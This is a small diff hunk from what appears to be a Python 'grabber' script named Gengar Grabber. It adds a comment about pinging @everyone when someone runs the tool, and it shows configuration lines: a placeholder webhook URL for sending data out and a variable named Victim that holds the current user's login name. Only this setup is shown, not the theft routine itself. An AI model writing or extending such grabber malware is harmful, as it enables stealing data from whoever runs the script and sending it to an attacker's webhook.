@@ -5,6 +5,7 @@ import requests
 import urllib.request
 import datetime
 
+#if True, it will ping @everyone when someone ran Gengar Grabber
 ping_me = True
 webhook_url = 'WEBHOOK_HERE'
 Victim = os.getlogin()
